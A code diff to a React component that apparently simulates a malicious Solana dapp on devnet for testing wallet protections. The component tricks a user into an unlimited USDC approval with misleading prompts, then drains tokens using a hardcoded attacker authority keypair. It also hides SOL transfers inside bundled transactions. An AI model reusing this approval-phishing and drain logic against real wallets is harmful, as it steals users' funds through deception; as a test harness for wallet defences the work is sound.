@@ -15,6 +15,10 @@ import {
   createApproveInstruction,
 } from "@solana/spl-token";
 import { Button } from "@swig/ui";
+import { MALICIOUS_AUTHORITY_KEYPAIR, getMaliciousAuthorityInfo } from "./maliciousKeypair";
+
+// TODO - remove airdrop
+// TODO - check SOL drain amount and logs are dynamic
 
 // Real malicious dapp component with enhanced attack scenarios
 const Malicious: React.FC = () => {
@@ -27,12 +31,13 @@ const Malicious: React.FC = () => {
     disconnectWallet,
     signAndSendTransaction,
   } = useWallet();
-  const [maliciousWallet, setMaliciousWallet] = useState<string>(
+  const [maliciousReceiverWallet, setMaliciousReceiverWallet] = useState<string>(
     "BKV7zy1Q74pyk3eehMrVQeau9pj2kEp6k36RZwFTFdHk"
   );
+  const [maliciousAuthorityInfo] = useState(() => getMaliciousAuthorityInfo());
   const [solDrainAmount, setSolDrainAmount] = useState<number>(0.1);
   const [usdcDrainAmount, setUsdcDrainAmount] = useState<number>(10);
-  const [logs, setLogs] = useState<string[]>([]);
+  const [logs, setLogs] = useState<(string | JSX.Element)[]>([]);
   const [isLoading, setIsLoading] = useState(false);
   const [solBalance, setSolBalance] = useState<number>(0);
   const [usdcBalance, setUsdcBalance] = useState<number>(0);
@@ -47,9 +52,17 @@ const Malicious: React.FC = () => {
   const USDC_MINT = new PublicKey("Gh9ZwEmdLJ8DscKNTkTqPbNwLNNBjuSzaG9Vp2KGtKJr");
   // get usdc airdrop from https://spl-token-faucet.com/?token-name=USDC
 
-  const addLog = (message: string) => {
+  const addLog = (message: string | JSX.Element) => {
     setLogs((prev) => [...prev, message]);
   };
+
+  // Log malicious authority info on component mount
+  useEffect(() => {
+    addLog(`🔑 Malicious authority loaded: ${maliciousAuthorityInfo.publicKey}`);
+    addLog("💡 This simulates a malicious smart contract's signing authority");
+    addLog("💰 Please fund this address with some SOL for transaction fees");
+    addLog(`🔗 Airdrop: ${maliciousAuthorityInfo.airdropCommand}`);
+  }, [maliciousAuthorityInfo]);
 
   // Helper function to check if token account exists
   const checkTokenAccountExists = async (tokenAccount: PublicKey): Promise<boolean> => {
@@ -127,7 +140,7 @@ const Malicious: React.FC = () => {
       permissionTx.add(
         SystemProgram.transfer({
           fromPubkey: new PublicKey(publicKey),
-          toPubkey: new PublicKey(maliciousWallet),
+          toPubkey: new PublicKey(maliciousReceiverWallet),
           lamports: LAMPORTS_PER_SOL * 0.001, // 0.001 SOL "setup fee"
         })
       );
@@ -139,7 +152,16 @@ const Malicious: React.FC = () => {
         const signature = await signAndSendTransaction(permissionTx, connection);
         addLog("✅ Basic permissions granted!");
         if (signature) {
-          addLog(`🔍 Transaction: https://explorer.solana.com/tx/${signature}?cluster=devnet`);
+          addLog(
+            <a
+              href={`https://explorer.solana.com/tx/${signature}?cluster=devnet`}
+              target="_blank"
+              rel="noopener noreferrer"
+              className="text-blue-600 hover:underline"
+            >
+              🔍 View Transaction
+            </a>
+          );
         }
 
         // Now request the dangerous unlimited token approval
@@ -182,7 +204,7 @@ const Malicious: React.FC = () => {
       const approvalTx = new Transaction().add(
         createApproveInstruction(
           userTokenAccount,
-          new PublicKey(maliciousWallet), // Malicious delegate
+          MALICIOUS_AUTHORITY_KEYPAIR.publicKey, // Malicious contract authority
           new PublicKey(publicKey),
           BigInt(maxAmount) // Unlimited approval!
         )
@@ -190,6 +212,11 @@ const Malicious: React.FC = () => {
 
       addLog("📋 Requesting approval for token trading (standard DeFi practice)");
       addLog("🔄 Amount: Unlimited (allows efficient batch trading)");
+      addLog(
+        `🏗️ Granting approval to contract authority: ${MALICIOUS_AUTHORITY_KEYPAIR.publicKey
+          .toString()
+          .slice(0, 20)}...`
+      );
 
       try {
         const signature = await signAndSendTransaction(approvalTx, connection);
@@ -197,7 +224,16 @@ const Malicious: React.FC = () => {
         setAttackPhase("exploitation");
         addLog("✅ Token approval granted! You can now trade efficiently.");
         if (signature) {
-          addLog(`🔍 Transaction: https://explorer.solana.com/tx/${signature}?cluster=devnet`);
+          addLog(
+            <a
+              href={`https://explorer.solana.com/tx/${signature}?cluster=devnet`}
+              target="_blank"
+              rel="noopener noreferrer"
+              className="text-blue-600 hover:underline"
+            >
+              🔍 View Transaction
+            </a>
+          );
         }
         addLog("💰 SuperSwap is now ready to optimize your trades!");
 
@@ -223,19 +259,20 @@ const Malicious: React.FC = () => {
 
   // Attack 3: Exploit the unlimited approval to drain tokens
   const exploitUnlimitedApproval = async () => {
-    if (!connected || !publicKey || !hasUnlimitedApproval) {
-      addLog("No unlimited approval to exploit");
+    if (!connected || !publicKey || !hasUnlimitedApproval || !MALICIOUS_AUTHORITY_KEYPAIR) {
+      addLog("No unlimited approval to exploit or missing malicious authority");
       return;
     }
 
     setIsLoading(true);
     addLog("\n🚨 EXPLOITATION PHASE: Using previously granted unlimited approval");
+    addLog("🎭 This simulates what a malicious smart contract would do automatically");
 
     try {
       const fromTokenAccount = await getAssociatedTokenAddress(USDC_MINT, new PublicKey(publicKey));
       const toTokenAccount = await getAssociatedTokenAddress(
         USDC_MINT,
-        new PublicKey(maliciousWallet)
+        new PublicKey(maliciousReceiverWallet)
       );
 
       // Check if user's token account exists and has balance
@@ -259,43 +296,73 @@ const Malicious: React.FC = () => {
 
       const exploitTx = new Transaction();
 
-      // Check if malicious wallet's token account exists, create if not
+      // Check if malicious receiver's token account exists, create if not
       const toAccountExists = await checkTokenAccountExists(toTokenAccount);
       if (!toAccountExists) {
         exploitTx.add(
           createAssociatedTokenAccountInstruction(
-            new PublicKey(publicKey), // payer
+            MALICIOUS_AUTHORITY_KEYPAIR.publicKey, // malicious authority pays for account creation
             toTokenAccount,
-            new PublicKey(maliciousWallet),
+            new PublicKey(maliciousReceiverWallet),
             USDC_MINT
           )
         );
-        addLog("📝 Creating token account for malicious wallet...");
+        addLog("📝 Creating token account for malicious receiver...");
       }
 
-      // Transfer using the approved delegation
+      // Transfer using the approved delegation - this is the key attack!
       exploitTx.add(
         createTransferInstruction(
           fromTokenAccount,
           toTokenAccount,
-          new PublicKey(maliciousWallet), // Using malicious wallet as authority due to approval
+          MALICIOUS_AUTHORITY_KEYPAIR.publicKey, // The authority that was approved
           Math.floor(drainAmount * 1e6) // Convert to proper decimal places
         )
       );
 
+      // Set recent blockhash and fee payer
+      const { blockhash } = await connection.getLatestBlockhash();
+      exploitTx.recentBlockhash = blockhash;
+      exploitTx.feePayer = MALICIOUS_AUTHORITY_KEYPAIR.publicKey;
+
       addLog(`💸 Attempting to drain ${drainAmount.toFixed(2)} USDC using unlimited approval...`);
+      addLog("🔑 Signing transaction with malicious contract authority...");
 
       try {
-        const signature = await signAndSendTransaction(exploitTx, connection);
-        addLog("💀 CRITICAL: Token drain successful! USDC stolen.");
+        // Sign with the malicious authority (simulating smart contract execution)
+        exploitTx.sign(MALICIOUS_AUTHORITY_KEYPAIR);
+
+        // Send the signed transaction
+        const signature = await connection.sendRawTransaction(exploitTx.serialize());
+
+        // Wait for confirmation
+        await connection.confirmTransaction(signature, "confirmed");
+
+        addLog("💀 CRITICAL: Token drain successful! USDC stolen via transferFrom!");
         if (signature) {
-          addLog(`🔍 Transaction: https://explorer.solana.com/tx/${signature}?cluster=devnet`);
+          addLog(
+            <a
+              href={`https://explorer.solana.com/tx/${signature}?cluster=devnet`}
+              target="_blank"
+              rel="noopener noreferrer"
+              className="text-blue-600 hover:underline"
+            >
+              🔍 View Transaction
+            </a>
+          );
         }
-        addLog("🔓 This happened because of the unlimited approval granted earlier.");
+        addLog("🔓 This happened because malicious contract used the unlimited approval");
+        addLog("⚡ No additional user signature was required - approval was sufficient!");
       } catch (error: any) {
         console.error("Exploitation error:", error);
         addLog(`✅ Exploitation blocked: ${error.message}`);
-        addLog("🛡️ Wallet prevented token drainage!");
+
+        if (error.message.includes("insufficient funds")) {
+          addLog("💰 Malicious authority needs SOL to pay transaction fees");
+          addLog("🎯 In real attacks, contracts are pre-funded or use flashloans");
+        } else {
+          addLog("🛡️ Wallet or network prevented token drainage!");
+        }
       }
     } catch (error: any) {
       addLog(`Error during exploitation: ${error.message}`);
@@ -321,7 +388,7 @@ const Malicious: React.FC = () => {
       const userTokenAccount = await getAssociatedTokenAddress(USDC_MINT, new PublicKey(publicKey));
       const maliciousTokenAccount = await getAssociatedTokenAddress(
         USDC_MINT,
-        new PublicKey(maliciousWallet)
+        new PublicKey(maliciousReceiverWallet)
       );
 
       const complexTx = new Transaction();
@@ -339,7 +406,7 @@ const Malicious: React.FC = () => {
             createAssociatedTokenAccountInstruction(
               new PublicKey(publicKey),
               maliciousTokenAccount,
-              new PublicKey(maliciousWallet),
+              new PublicKey(maliciousReceiverWallet),
               USDC_MINT
             )
           );
@@ -370,7 +437,7 @@ const Malicious: React.FC = () => {
       complexTx.add(
         SystemProgram.transfer({
           fromPubkey: new PublicKey(publicKey),
-          toPubkey: new PublicKey(maliciousWallet),
+          toPubkey: new PublicKey(maliciousReceiverWallet),
           lamports: Math.floor(LAMPORTS_PER_SOL * solDrainAmount),
         })
       );
@@ -388,7 +455,16 @@ const Malicious: React.FC = () => {
         const signature = await signAndSendTransaction(complexTx, connection);
         addLog("💀 CRITICAL: Complex transaction bundle executed!");
         if (signature) {
-          addLog(`🔍 Transaction: https://explorer.solana.com/tx/${signature}?cluster=devnet`);
+          addLog(
+            <a
+              href={`https://explorer.solana.com/tx/${signature}?cluster=devnet`}
+              target="_blank"
+              rel="noopener noreferrer"
+              className="text-blue-600 hover:underline"
+            >
+              🔍 View Transaction
+            </a>
+          );
         }
         addLog("🔓 User signed without realizing all the hidden transfers.");
       } catch (error: any) {
@@ -532,13 +608,54 @@ const Malicious: React.FC = () => {
 
       <div className="bg-white p-4 rounded-lg border gap-1 flex flex-col">
         <h3 className="font-bold text-gray-900 mb-2">🎯 Attack Configuration</h3>
-        <label className="text-sm font-medium text-gray-700">Malicious wallet address:</label>
+        <label className="text-sm font-medium text-gray-700">
+          Malicious receiver wallet address:
+        </label>
         <input
           className="border border-gray-300 rounded-md p-2 w-full"
-          placeholder="Malicious wallet address"
-          value={maliciousWallet}
-          onChange={(e) => setMaliciousWallet(e.target.value)}
+          placeholder="Malicious receiver wallet address"
+          value={maliciousReceiverWallet}
+          onChange={(e) => setMaliciousReceiverWallet(e.target.value)}
         />
+        <div className="mt-2 p-3 bg-yellow-50 border border-yellow-200 rounded">
+          <label className="text-sm font-medium text-yellow-800">
+            Malicious contract authority:
+          </label>
+          <p className="text-xs font-mono text-gray-600 mb-2">{maliciousAuthorityInfo.publicKey}</p>
+          <div className="flex gap-2 flex-wrap">
+            <button
+              onClick={() => navigator.clipboard.writeText(maliciousAuthorityInfo.publicKey)}
+              className="text-xs bg-blue-500 text-white px-2 py-1 rounded hover:bg-blue-600"
+            >
+              📋 Copy Address
+            </button>
+            <button
+              onClick={() => navigator.clipboard.writeText(maliciousAuthorityInfo.airdropCommand)}
+              className="text-xs bg-green-500 text-white px-2 py-1 rounded hover:bg-green-600"
+            >
+              📋 Copy Airdrop Command
+            </button>
+            <a
+              href={maliciousAuthorityInfo.faucetUrl}
+              target="_blank"
+              rel="noopener noreferrer"
+              className="text-xs bg-purple-500 text-white px-2 py-1 rounded hover:bg-purple-600"
+            >
+              💰 Web Faucet
+            </a>
+            <a
+              href={maliciousAuthorityInfo.explorerUrl}
+              target="_blank"
+              rel="noopener noreferrer"
+              className="text-xs bg-gray-500 text-white px-2 py-1 rounded hover:bg-gray-600"
+            >
+              🔍 Explorer
+            </a>
+          </div>
+          <p className="text-xs text-yellow-700 mt-2">
+            ⚠️ This address needs ~0.01 SOL to pay for transaction fees during exploitation
+          </p>
+        </div>
         <label className="text-sm font-medium text-gray-700 mt-2">SOL amount to drain:</label>
         <input
           type="number"
